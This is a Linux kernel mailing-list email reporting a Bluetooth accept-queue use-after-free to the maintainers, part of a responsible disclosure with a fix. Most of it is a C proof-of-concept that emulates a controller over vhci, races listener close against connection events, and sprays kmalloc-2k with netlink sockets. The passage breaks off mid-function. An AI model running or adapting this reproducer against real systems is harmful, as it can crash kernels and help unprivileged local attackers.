Received: from mail-pg1-f174.google.com (mail-pg1-f174.google.com [209.85.215.174])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 15A3744606A
	for <stable@vger.kernel.org>; Thu,  3 Sep 2026 11:11:25 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.174
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1788433890; cv=none; b=tvBaJvsxKqFsxlypM2Tc4XU86X5OaZHx4API7CT3Bd3WCgCLiA1nNPG5JpZNS/0O9ZGCtvFZJ0w10wPqxz5LxTnqKCIBO45dWvV8UWvZX4GrtACjby7SYqVVxM3FOInUtjC98tWD4mXjlcC4CN//kFQZBOR3XQz6NSe4pTcdDQY=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1788433890; c=relaxed/simple;
	bh=GaqHSN+zsY/R+Mle/vRv5tKQ42WvsceDD5lebKZMtDM=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=C4hvjB1bmeCjDs/jYuLgudu76QnPUZAy6mak/EQPJY26Pd8GdZjJBLP8/n3SLiR2LY21Sd30MQvltuYOkP/S9zLC0Tfow+B9izVS4rIyHqD2H7Nof7aVF9yFFoqE5CVOgG3h2NlcXaIM29Pod61TTNOX8mXbZNb/Pj8uNWjdsiE=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=UT9Yt4tv; arc=none smtp.client-ip=209.85.215.174
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="UT9Yt4tv"
Received: by mail-pg1-f174.google.com with SMTP id 41be03b00d2f7-c9e607d81fcso1489572a12.2
        for <stable@vger.kernel.org>; Thu, 03 Sep 2026 04:11:25 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1788433885; x=1789038685; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=OEdvBmxASaiKQPF7H/6hWi1n72mZ2igl+sAi9KePD18=;
        b=UT9Yt4tvcCIIG0KWiINVmdPcZjdmg6SNXQ8sV/Tbx7igKPmEnrebE7krDwUrHYzjaB
         GvPQsyjPYCGJjk2GjgeFZ+PgUuahTiTwuvgdtky+BlHkLM4SJgMvlz1GaAVvD0fhhYut
         +evrulSKcSJRobfTfxDVfzIqW+3vxwndFgS72kN+bkNJJrKDcX5TA7UaR7XvJe3Duzn9
         JIgV071H3ewhJiWwK7cnmqw0JD6DKiNTnjrceoMEYqJZNrdKWjLs+GtC3NGi/GVrpnYW
         VZdrI5q/xuK+swPaviY2FlDeAh9/Igo+0s4a3LvrlW8YJ3TD4Ys7RNJ8/gym7QMP0cQR
         aOMQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1788433885; x=1789038685;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=OEdvBmxASaiKQPF7H/6hWi1n72mZ2igl+sAi9KePD18=;
        b=OQ+lzO4UGdpGyoFv+Xrb+xZoKO26XXpCycqP6yvM+9IALf33hks2J26XSga1kgO4fD
         rkeu4QMybOeD32Qj2C7xdse9fpGHMY/ccnZ+FGMZHZ/CDcPnTJiGQvSlPyoxNWAV8R5L
         0QOXrNbg8i39Xn2AIHTjgyhLcSxv9GY6DMXQVqdfd7hZbj5dknjz67HPfpntbrzb8YpD
         ZMGbvLFHJKHba7Xk5VjhW1L+kMRc/Za/hbVo1hgPN7lglRAphnKYOHG8RHq3pVAua5JE
         a16nsGT4FX6lxxUT5WKwECaF1wy4OeYwkDXkG0llTbvPQOEaXSL7yID0LfSPiXC9YLSi
         Sagw==
X-Forwarded-Encrypted: i=1; AKwUvBxxaiDQDuybjHodKVmaQ7wvoG0rWkyyIBFhkgH7sbb0x/brJffOoP9CK8WjUWOdM9o8NbjpceA=@vger.kernel.org
X-Gm-Message-State: AFuF++livnozq31vo7LiLTOKRYYwRxRzYtyzJYbJhkVqtUxH0kv0BYbn
	PpITkkw1KeFxrHGzWskFOUkBqviq5XtpWr3poPBtVGJntEZ+UYlIvKUWyDfRiYJQHDj6
X-Gm-Gg: AYBFou2UC/Pj0f9AKq2LAZAJ2j3HajrSTmFCZtk3Hp1A50Zp7n51MSboNAgkYZGBpk+
	ZpGrxBLhBvwylp9b8DiTC43jB4cvDIuFoQTEYO8pfHLoLlA1XHaLNYHTxRRQOwLzTcehM1GIx7c
	TSOkIljSXpvJm0mSoxq0Ad6r3mgndW+z+S+oJSq0OWZiY0vS5AfBJmLwwDmUObyhAfVGOnfAAou
	vR6/ibRo8cjqD3qp4bkxDC6hN0UrHL966hRow3wOglCwznJJaq2rTwMYbwtbEjJJwHyZW0qOuYf
	sQmYFe41GQnTNOIyz8TNIJHheoCQkdGELLvI26YzLtLQKkCuu35MNQICGDsycGZUOhnBjyxdRfV
	cujIGP6PAq/bas+tqm4qFLgkqWW3P4JgGN2/XaEO3grF5qYNbKJ6AmYnUJGSU4GMHdx2If+e3I/
	3n1PaR95TFrhmxXZFeXikzeUrSPyeKrkr5A/dCI512hjNRYg0nD0M+p6aBUPl1n/rZB8j/6ZZtd
	jOFLuEkch1Ej2LyThmvHHQAOtm4ZQ==
X-Received: by 2002:a17:90b:5828:b0:38e:2e86:ed02 with SMTP id 98e67ed59e1d1-39aee0850bcmr17965089a91.14.1788433884511;
        Thu, 03 Sep 2026 04:11:24 -0700 (PDT)
Received: from b6ad5085b32f.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-39b08c3a526sm4810773a91.10.2026.09.03.04.11.21
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 03 Sep 2026 04:11:23 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: linux-bluetooth@vger.kernel.org
Cc: Marcel Holtmann <marcel@holtmann.org>,
	Luiz Augusto von Dentz <luiz.dentz@gmail.com>,
	linux-kernel@vger.kernel.org,
	stable@vger.kernel.org,
	Zihan Xi <zihanx@nebusec.ai>
Subject: [PATCH v2 0/1] Bluetooth: Fix parent socket UAF in accept queues
Date: Thu,  3 Sep 2026 11:11:17 +0000
Message-ID: <cover.1788259244.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a issue in net/bluetooth/af_bluetooth.c. The bug is
reachable by a non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

bt_accept_enqueue() stores the listening socket in bt_sk(sk)->parent when a
child is queued, but it only takes a reference on the child. The queued
child can therefore keep a raw parent pointer after the listener has been
closed and freed.

The crash happens in l2cap_sock_ready_cb(). That callback reads
bt_sk(sk)->parent and then calls parent->sk_data_ready(parent) without
holding the parent. Without an accept-queue reference on the parent,
listener close can drop the last parent reference before the callback runs.

The same parent-lifetime rule applies to teardown paths that snapshot the
parent, call bt_accept_unlink(sk), and then notify the parent. Once the
accept queue owns a parent reference, bt_accept_unlink() drops that queue
reference, so those post-unlink notification paths need a temporary parent
reference around the unlink and notification.

This parent-lifetime hole already existed in the original Bluetooth
accept-queue implementation from 1da177e4c3f4 ("Linux-2.6.12-rc2"). Later
L2CAP, ISO and RFCOMM callback paths only made the same stale parent
pointer easier to hit, so Fixes: still points at the original
implementation rather than a later trigger-surface change.

On bluetooth-next 870187be2362,
9db7e5fffbae ("Bluetooth: L2CAP: reject accept queue add unless BT_LISTEN")
rejects l2cap_sock_new_connection_cb() once the parent has left BT_LISTEN.
That later commit blocks the enqueue-after-close window used by this
reproducer, so the same ready_cb UAF did not fire on that baseline in our
local runs. 9db7e5fffbae does not take a reference on the parent, so it is
not a substitute for this fix. bluetooth-next/master has since moved to
6696072ffe07 and still lacks the parent hold.

The crash log below was captured on the same bluetooth-next baseline after
reverting 9db7e5fffbae (guest UTS 7.2.0-rc6-01475-gd165de3d1c70). It is
experimental evidence for the missing parent hold, not a crash from
unmodified 870187be2362. That QEMU guest had 4 vCPUs and 2 GB RAM; the
log field CPU: 2 is the crashing processor index, not the vCPU count.

The PoC is a vhci L2CAP listen/close versus CONN_COMPLETE/INFO_RSP race. It
is not a packetdrill script, because the trigger depends on Bluetooth vhci
and socket lifetime rather than a TCP/UDP/SCTP packet sequence. Build the
included source with pthread support and run mode 7:

    gcc -O2 -static -pthread -o poc poc.c
    unshare -Urn ./poc 2500 2 7

Reproducer:

    gcc -O2 -static -o poc poc.c
    unshare -Urn ./poc

We run the PoC in a 4 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <linux/netlink.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <unistd.h>

#ifndef AF_BLUETOOTH
#define AF_BLUETOOTH 31
#endif

#define BTPROTO_L2CAP 0
#define BTPROTO_HCI 1
#define HCI_CHANNEL_CONTROL 3
#define HCI_DEV_NONE 0xffff
#define HCI_COMMAND_PKT 0x01
#define HCI_ACLDATA_PKT 0x02
#define HCI_EVENT_PKT 0x04
#define HCI_VENDOR_PKT 0xff
#define HCI_OP_DISCONNECT 0x0406
#define HCI_OP_ACCEPT_CONN_REQ 0x0409
#define HCI_OP_REJECT_CONN_REQ 0x040a
#define HCI_OP_AUTH_REQUESTED 0x0411
#define HCI_OP_SET_CONN_ENCRYPT 0x0413
#define HCI_OP_READ_REMOTE_FEATURES 0x041b
#define HCI_OP_READ_REMOTE_EXT_FEATURES 0x041c
#define HCI_OP_WRITE_SCAN_ENABLE 0x0c1a
#define HCI_OP_RESET 0x0c03
#define HCI_OP_READ_LOCAL_VERSION 0x1001
#define HCI_OP_READ_LOCAL_COMMANDS 0x1002
#define HCI_OP_READ_LOCAL_FEATURES 0x1003
#define HCI_OP_READ_LOCAL_EXT_FEATURES 0x1004
#define HCI_OP_READ_BUFFER_SIZE 0x1005
#define HCI_OP_READ_BD_ADDR 0x1009
#define HCI_OP_LE_READ_BUFFER_SIZE 0x2002
#define HCI_OP_LE_READ_LOCAL_FEATURES 0x2003
#define HCI_EV_CONN_COMPLETE 0x03
#define HCI_EV_CONN_REQUEST 0x04
#define HCI_EV_DISCONN_COMPLETE 0x05
#define HCI_EV_AUTH_COMPLETE 0x06
#define HCI_EV_ENCRYPT_CHANGE 0x08
#define HCI_EV_REMOTE_FEATURES 0x0b
#define HCI_EV_CMD_COMPLETE 0x0e
#define HCI_EV_CMD_STATUS 0x0f
#define HCI_EV_NUM_COMP_PKTS 0x13
#define HCI_EV_REMOTE_EXT_FEATURES 0x23
#define HCI_LINK_ACL 0x01
#define ACL_START_NO_FLUSH 0x00
#define SCAN_PAGE 0x02
#define SCAN_INQUIRY 0x01
#define HCIDEVUP _IOW(72, 201, int)
#define HCISETSCAN _IOW(72, 221, int)
#define L2CAP_CID_SIGNALING 0x0001
#define L2CAP_INFO_REQ 0x0a
#define L2CAP_INFO_RSP 0x0b
#define L2CAP_IT_FEAT_MASK 0x0002
#define L2CAP_IR_SUCCESS 0x0000
#define L2CAP_FEAT_FIXED_CHAN 0x00000080
static uint16_t fixed_cid = 0xfffa;
#define MGMT_OP_SET_POWERED 0x0005
#define MGMT_OP_SET_CONNECTABLE 0x0007
#define MGMT_OP_SET_BONDABLE 0x0009
#define MGMT_OP_SET_DISCOVERABLE 0x0006
#define SOCK_SPRAY 32

typedef struct { uint8_t b[6]; } bdaddr_t;

struct sockaddr_l2 {
	sa_family_t l2_family;
	uint16_t l2_psm;
	bdaddr_t l2_bdaddr;
	uint16_t l2_cid;
	uint8_t l2_bdaddr_type;
} __attribute__((packed));

struct sockaddr_hci {
	sa_family_t hci_family;
	unsigned short hci_dev;
	unsigned short hci_channel;
};

struct hci_command_hdr { uint16_t opcode; uint8_t plen; } __attribute__((packed));
struct hci_event_hdr { uint8_t evt; uint8_t plen; } __attribute__((packed));
struct hci_ev_cmd_complete { uint8_t ncmd; uint16_t opcode; } __attribute__((packed));
struct hci_ev_cmd_status { uint8_t status; uint8_t ncmd; uint16_t opcode; } __attribute__((packed));
struct hci_acl_hdr { uint16_t handle; uint16_t dlen; } __attribute__((packed));
struct hci_comp_pkts_info { uint16_t handle; uint16_t count; } __attribute__((packed));
struct hci_ev_num_comp_pkts { uint8_t num; struct hci_comp_pkts_info info; } __attribute__((packed));
struct hci_dev_req { uint16_t dev_id; uint32_t dev_opt; } __attribute__((packed));
struct vhci_vendor_pkt_request { uint8_t type; uint8_t opcode; } __attribute__((packed));
struct hci_rp_read_bd_addr { uint8_t status; bdaddr_t bdaddr; } __attribute__((packed));
struct hci_rp_read_buffer_size { uint8_t status; uint16_t acl_mtu; uint8_t sco_mtu; uint16_t acl_max_pkt; uint16_t sco_max_pkt; } __attribute__((packed));
struct hci_rp_read_local_features { uint8_t status; uint8_t features[8]; } __attribute__((packed));
struct hci_cp_read_local_ext_features { uint8_t page; } __attribute__((packed));
struct hci_rp_read_local_ext_features { uint8_t status; uint8_t page; uint8_t max_page; uint8_t features[8]; } __attribute__((packed));
struct hci_rp_read_local_commands { uint8_t status; uint8_t commands[64]; } __attribute__((packed));
struct hci_rp_read_local_version { uint8_t status; uint8_t hci_ver; uint16_t hci_rev; uint8_t lmp_ver; uint16_t manufacturer; uint16_t lmp_subver; } __attribute__((packed));
struct hci_rp_le_read_buffer_size { uint8_t status; uint16_t le_mtu; uint8_t le_max_pkt; } __attribute__((packed));
struct hci_rp_le_read_local_features { uint8_t status; uint8_t features[8]; } __attribute__((packed));
struct l2cap_hdr { uint16_t len; uint16_t cid; } __attribute__((packed));
struct l2cap_cmd_hdr { uint8_t code; uint8_t ident; uint16_t len; } __attribute__((packed));
struct hci_ev_conn_request { bdaddr_t bdaddr; uint8_t dev_class[3]; uint8_t link_type; } __attribute__((packed));
struct hci_ev_conn_complete { uint8_t status; uint16_t handle; bdaddr_t bdaddr; uint8_t link_type; uint8_t encr_mode; } __attribute__((packed));
struct hci_ev_remote_features { uint8_t status; uint16_t handle; uint8_t features[8]; } __attribute__((packed));
struct hci_ev_remote_ext_features { uint8_t status; uint16_t handle; uint8_t page; uint8_t max_page; uint8_t features[8]; } __attribute__((packed));
struct hci_ev_auth_complete { uint8_t status; uint16_t handle; } __attribute__((packed));
struct hci_ev_encrypt_change { uint8_t status; uint16_t handle; uint8_t encrypt; } __attribute__((packed));
struct hci_ev_disconn_complete { uint8_t status; uint16_t handle; uint8_t reason; } __attribute__((packed));
struct hci_cp_accept_conn_req { bdaddr_t bdaddr; uint8_t role; } __attribute__((packed));
struct hci_cp_disconnect { uint16_t handle; uint8_t reason; } __attribute__((packed));
struct mgmt_hdr { uint16_t opcode; uint16_t index; uint16_t len; } __attribute__((packed));

static const bdaddr_t local_bdaddr = { .b = { 0x66, 0x55, 0x44, 0x33, 0x22, 0x11 } };

static int vhci_fd = -1;
static int hci_dev_id = -1;
static volatile bool running = true;
static volatile int listener_fd = -1;
static volatile unsigned int close_delay_us;
static volatile bool close_armed;
static volatile bool close_done;
static volatile bool auto_conn_complete = true;
static volatile bool complete_armed;
static volatile bool complete_done;
static volatile unsigned int complete_delay_us;
static volatile unsigned int shutdown_gap_us;
static volatile bool saw_accept_conn;
static volatile bool saw_reject_conn;
static volatile bool saw_info_req;
static volatile uint8_t info_ident;
static volatile uint16_t info_type;
static volatile uint16_t cur_handle = 0x00c8;
static bdaddr_t cur_remote;
static pthread_mutex_t io_lock = PTHREAD_MUTEX_INITIALIZER;
static unsigned long long stat_cmd, stat_acl, stat_info_req, stat_close, stat_info_rsp;

static void die(const char *msg)
{
	perror(msg);
	exit(1);
}

static void pin_cpu(int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	(void)pthread_setaffinity_np(pthread_self(), sizeof(set), &set);
}

static void xwritev_locked(const struct iovec *iov, int iovcnt)
{
	pthread_mutex_lock(&io_lock);
	if (writev(vhci_fd, iov, iovcnt) < 0) {
		pthread_mutex_unlock(&io_lock);
		die("writev /dev/vhci");
	}
	pthread_mutex_unlock(&io_lock);
}

static void xwrite_locked(const void *buf, size_t len)
{
	pthread_mutex_lock(&io_lock);
	if (write(vhci_fd, buf, len) < 0) {
		pthread_mutex_unlock(&io_lock);
		die("write /dev/vhci");
	}
	pthread_mutex_unlock(&io_lock);
}

static void send_hci_event(uint8_t evt, const void *data, size_t len)
{
	struct iovec iv[3];
	struct hci_event_hdr hdr;
	uint8_t type = HCI_EVENT_PKT;

	hdr.evt = evt;
	hdr.plen = (uint8_t)len;
	iv[0].iov_base = &type;
	iv[0].iov_len = 1;
	iv[1].iov_base = &hdr;
	iv[1].iov_len = sizeof(hdr);
	iv[2].iov_base = (void *)data;
	iv[2].iov_len = len;
	xwritev_locked(iv, 3);
}

static void send_cmd_complete(uint16_t opcode, const void *data, size_t len)
{
	struct iovec iv[4];
	uint8_t type = HCI_EVENT_PKT;
	struct hci_event_hdr hdr;
	struct hci_ev_cmd_complete cc;

	hdr.evt = HCI_EV_CMD_COMPLETE;
	hdr.plen = (uint8_t)(sizeof(cc) + len);
	cc.ncmd = 1;
	cc.opcode = opcode;
	iv[0].iov_base = &type;
	iv[0].iov_len = 1;
	iv[1].iov_base = &hdr;
	iv[1].iov_len = sizeof(hdr);
	iv[2].iov_base = &cc;
	iv[2].iov_len = sizeof(cc);
	iv[3].iov_base = (void *)data;
	iv[3].iov_len = len;
	xwritev_locked(iv, 4);
}

static void send_cmd_status(uint16_t opcode, uint8_t status)
{
	struct hci_ev_cmd_status ev;

	ev.status = status;
	ev.ncmd = 1;
	ev.opcode = opcode;
	send_hci_event(HCI_EV_CMD_STATUS, &ev, sizeof(ev));
}

static void send_num_comp_pkts(uint16_t handle, uint16_t count)
{
	struct hci_ev_num_comp_pkts ev;

	ev.num = 1;
	ev.info.handle = handle;
	ev.info.count = count;
	send_hci_event(HCI_EV_NUM_COMP_PKTS, &ev, sizeof(ev));
}

static void send_acl_handle(uint16_t handle, uint16_t cid, const void *payload, size_t payload_len)
{
	uint8_t buf[256];
	struct hci_acl_hdr *acl;
	struct l2cap_hdr *lh;
	uint16_t handle_flags;

	buf[0] = HCI_ACLDATA_PKT;
	acl = (struct hci_acl_hdr *)&buf[1];
	handle_flags = (uint16_t)((handle & 0x0fff) | (ACL_START_NO_FLUSH << 12));
	acl->handle = handle_flags;
	acl->dlen = (uint16_t)(sizeof(*lh) + payload_len);
	lh = (struct l2cap_hdr *)&buf[1 + sizeof(*acl)];
	lh->len = (uint16_t)payload_len;
	lh->cid = cid;
	memcpy(buf + 1 + sizeof(*acl) + sizeof(*lh), payload, payload_len);
	xwrite_locked(buf, 1 + sizeof(*acl) + sizeof(*lh) + payload_len);
}

static void send_conn_complete(uint8_t status)
{
	struct hci_ev_conn_complete ev;

	memset(&ev, 0, sizeof(ev));
	ev.status = status;
	ev.handle = cur_handle;
	ev.bdaddr = cur_remote;
	ev.link_type = HCI_LINK_ACL;
	send_hci_event(HCI_EV_CONN_COMPLETE, &ev, sizeof(ev));
}

static void send_disconn_complete(uint16_t handle)
{
	struct hci_ev_disconn_complete ev;

	memset(&ev, 0, sizeof(ev));
	ev.status = 0;
	ev.handle = handle;
	ev.reason = 0x13;
	send_hci_event(HCI_EV_DISCONN_COMPLETE, &ev, sizeof(ev));
}

static void send_conn_request(void)
{
	struct hci_ev_conn_request ev;

	memset(&ev, 0, sizeof(ev));
	ev.bdaddr = cur_remote;
	ev.dev_class[0] = 0x0c;
	ev.dev_class[1] = 0x02;
	ev.dev_class[2] = 0x5a;
	ev.link_type = HCI_LINK_ACL;
	send_hci_event(HCI_EV_CONN_REQUEST, &ev, sizeof(ev));
}

static void send_remote_features(uint16_t handle)
{
	struct hci_ev_remote_features ev;

	memset(&ev, 0, sizeof(ev));
	ev.status = 0;
	ev.handle = handle;
	send_hci_event(HCI_EV_REMOTE_FEATURES, &ev, sizeof(ev));
}

static void send_info_rsp(uint8_t ident, uint16_t type)
{
	uint8_t payload[16];
	struct l2cap_cmd_hdr *cmd = (struct l2cap_cmd_hdr *)payload;
	uint16_t *fields = (uint16_t *)(payload + sizeof(*cmd));
	uint32_t feat = 0;

	/* Success without FIXED_CHAN so conn_start runs immediately. */
	cmd->code = L2CAP_INFO_RSP;
	cmd->ident = ident;
	cmd->len = 8;
	fields[0] = type ? type : L2CAP_IT_FEAT_MASK;
	fields[1] = L2CAP_IR_SUCCESS;
	memcpy(fields + 2, &feat, sizeof(feat));
	send_acl_handle(cur_handle, L2CAP_CID_SIGNALING, payload, sizeof(*cmd) + 8);
	__sync_add_and_fetch(&stat_info_rsp, 1);
}

static int setup_fixed_listener(void)
{
	int fd;
	struct sockaddr_l2 addr;

	fd = socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_L2CAP);
	if (fd < 0)
		die("socket l2cap");
	memset(&addr, 0, sizeof(addr));
	addr.l2_family = AF_BLUETOOTH;
	addr.l2_psm = 0;
	addr.l2_cid = fixed_cid;
	addr.l2_bdaddr_type = 0;
	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die("bind l2cap cid");
	if (listen(fd, 0) < 0)
		die("listen l2cap");
	return fd;
}

static void spray_kmalloc_2k(void)
{
	int i, fds[SOCK_SPRAY];

	for (i = 0; i < SOCK_SPRAY; i++)
		fds[i] = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
	for (i = 0; i < SOCK_SPRAY; i++) {
		if (fds[i] >= 0)
			close(fds[i]);
	}
}

static void close_listener_now(void)
{
	int fd = listener_fd;

	if (fd < 0)
		return;
	listener_fd = -1;
	close(fd);
	__sync_add_and_fetch(&stat_close, 1);
	spray_kmalloc_2k();
}

static void *close_thread(void *arg)
{
	(void)arg;
	pin_cpu(1);
	while (running) {
		if (!close_armed) {
			usleep(20);
			continue;
		}
		if (close_delay_us)
			usleep(close_delay_us);
		close_listener_now();
		close_armed = false;
		close_done = true;
	}
	return NULL;
}

static void *complete_thread(void *arg)
{
	(void)arg;
	pin_cpu(2);
	while (running) {
		if (!complete_armed) {
			usleep(20);
			continue;
		}
		if (complete_delay_us)
			usleep(complete_delay_us);
		send_conn_complete(0);
		send_remote_features(cur_handle);
		complete_armed = false;
		complete_done = true;
	}
	return NULL;
}

static void *shutdown_gap_thread(void *arg)
{
	(void)arg;
	pin_cpu(1);
	while (running) {
		int fd;
		unsigned int gap;
		unsigned int i;

		if (!close_armed) {
			usleep(20);
			continue;
		}
		fd = listener_fd;
		listener_fd = -1;
		gap = shutdown_gap_us;
		if (fd >= 0) {
			(void)shutdown(fd, SHUT_RDWR);
			if (gap)
				usleep(gap);
			else {
				for (i = 0; i < 2000; i++)
					__asm__ __volatile__("pause");
			}
			close(fd);
			__sync_add_and_fetch(&stat_close, 1);
			spray_kmalloc_2k();
		}
		close_armed = false;
		close_done = true;
	}
	return NULL;
}

static void process_hci_command(const uint8_t *buf, size_t len)
{
	const struct hci_command_hdr *hdr;

	if (len < sizeof(*hdr))
		return;
	hdr = (const struct hci_command_hdr *)buf;
	__sync_add_and_fetch(&stat_cmd, 1);
	switch (hdr->opcode) {
	case HCI_OP_RESET: {
		uint8_t st = 0;
		send_cmd_complete(hdr->opcode, &st, sizeof(st));
		break;
	}
	case HCI_OP_READ_LOCAL_VERSION: {
		struct hci_rp_read_local_version rp;

		memset(&rp, 0, sizeof(rp));
		rp.hci_ver = 9;
		rp.hci_rev = 1;
		rp.lmp_ver = 9;
		rp.manufacturer = 0x000f;
		rp.lmp_subver = 1;
		send_cmd_complete(hdr->opcode, &rp, sizeof(rp));
		break;
	}
	case HCI_OP_READ_LOCAL_COMMANDS: {
		struct hci_rp_read_local_commands rp;

		memset(&rp, 0xff, sizeof(rp));
		rp.status = 0;
		send_cmd_complete(hdr->opcode, &rp, sizeof(rp));
		break;
	}
	case HCI_OP_READ_LOCAL_FEATURES: {
		struct hci_rp_read_local_features rp;

		memset(&rp, 0, sizeof(rp));
		rp.features[0] = 0xff;
		rp.features[1] = 0xff;
		rp.features[2] = 0x8f;
		rp.features[3] = 0xfe;
		rp.features[4] = 0xdb;
		rp.features[5] = 0xff;
		rp.features[6] = 0x7b;
		rp.features[7] = 0x87;
		send_cmd_complete(hdr->opcode, &rp, sizeof(rp));
		break;
	}
	case HCI_OP_READ_LOCAL_EXT_FEATURES: {
		struct hci_rp_read_local_ext_features rp;
		const struct hci_cp_read_local_ext_features *cp;

		memset(&rp, 0, sizeof(rp));
		cp = (const struct hci_cp_read_local_ext_features *)(buf + sizeof(*hdr));
		if (len >= sizeof(*hdr) + sizeof(*cp))
			rp.page = cp->page;
		rp.max_page = 1;
		if (rp.page == 1)
			rp.features[0] = 0x01;
		send_cmd_complete(hdr->opcode, &rp, sizeof(rp));
		break;
	}
	case HCI_OP_READ_BD_ADDR: {
		struct hci_rp_read_bd_addr rp;

		memset(&rp, 0, sizeof(rp));
		rp.bdaddr = local_bdaddr;
		send_cmd_complete(hdr->opcode, &rp, sizeof(rp));
		break;
	}
	case HCI_OP_READ_BUFFER_SIZE: {
		struct hci_rp_read_buffer_size rp;

		memset(&rp, 0, sizeof(rp));
		rp.acl_mtu = 1021;
		rp.acl_max_pkt = 0x0fff;
		send_cmd_complete(hdr->opcode, &rp, sizeof(rp));
		break;
	}
	case HCI_OP_LE_READ_BUFFER_SIZE: {
		struct hci_rp_le_read_buffer_size rp;

		memset(&rp, 0, sizeof(rp));
		rp.le_mtu = 251;
		rp.le_max_pkt = 0xff;
		send_cmd_complete(hdr->opcode, &rp, sizeof(rp));
		break;
	}
	case HCI_OP_LE_READ_LOCAL_FEATURES: {
		struct hci_rp_le_read_local_features rp;

		memset(&rp, 0, sizeof(rp));
		rp.features[0] = 0x01;
		send_cmd_complete(hdr->opcode, &rp, sizeof(rp));
		break;
	}
	case HCI_OP_ACCEPT_CONN_REQ:
		if (len >= sizeof(*hdr) + sizeof(struct hci_cp_accept_conn_req))
			cur_remote = ((const struct hci_cp_accept_conn_req *)(buf + sizeof(*hdr)))->bdaddr;
		saw_accept_conn = true;
		send_cmd_status(hdr->opcode, 0);
		if (auto_conn_complete)
			send_conn_complete(0);
		break;
	case HCI_OP_REJECT_CONN_REQ:
		saw_reject_conn = true;
		send_cmd_status(hdr->opcode, 0);
		send_conn_complete(0x0f);
		break;
	case HCI_OP_READ_REMOTE_FEATURES:
		send_cmd_status(hdr->opcode, 0);
		send_remote_features(cur_handle);
		break;
	case HCI_OP_READ_REMOTE_EXT_FEATURES: {
		struct hci_ev_remote_ext_features ev;

		send_cmd_status(hdr->opcode, 0);
		memset(&ev, 0, sizeof(ev));
		ev.handle = cur_handle;
		ev.page = 1;
		ev.max_page = 1;
		send_hci_event(HCI_EV_REMOTE_EXT_FEATURES, &ev, sizeof(ev));
		break;
	}
	case HCI_OP_AUTH_REQUESTED: {
		struct hci_ev_auth_complete ev;

		send_cmd_status(hdr->opcode, 0);
		memset(&ev, 0, sizeof(ev));
		ev.handle = cur_handle;
		send_hci_event(HCI_EV_AUTH_COMPLETE, &ev, sizeof(ev));
		break;
	}
	case HCI_OP_SET_CONN_ENCRYPT: {
		struct hci_ev_encrypt_change ev;

		send_cmd_status(hdr->opcode, 0);
		memset(&ev, 0, sizeof(ev));
		ev.handle = cur_handle;
		ev.encrypt = 1;
		send_hci_event(HCI_EV_ENCRYPT_CHANGE, &ev, sizeof(ev));
		break;
	}
	case HCI_OP_DISCONNECT: {
		const struct hci_cp_disconnect *cp;

		send_cmd_status(hdr->opcode, 0);
		cp = (const struct hci_cp_disconnect *)(buf + sizeof(*hdr));
		if (len >= sizeof(*hdr) + sizeof(*cp))
			send_disconn_complete(cp->handle);
		else
			send_disconn_complete(cur_handle);
		break;
	}
	default: {
		uint8_t dummy[0xf9];

		memset(dummy, 0, sizeof(dummy));
		send_cmd_complete(hdr->opcode, dummy, sizeof(dummy));
		break;
	}
	}
}

static void process_acl_from_host(const uint8_t *buf, size_t len)
{
	const struct hci_acl_hdr *acl;
	const struct l2cap_hdr *lh;
	uint16_t handle, l2len, cid;
	const uint8_t *payload;
	size_t rem;

	if (len < 1 + sizeof(*acl) + sizeof(*lh))
		return;
	acl = (const struct hci_acl_hdr *)(buf + 1);
	handle = acl->handle & 0x0fff;
	lh = (const struct l2cap_hdr *)(buf + 1 + sizeof(*acl));
	l2len = lh->len;
	cid = lh->cid;
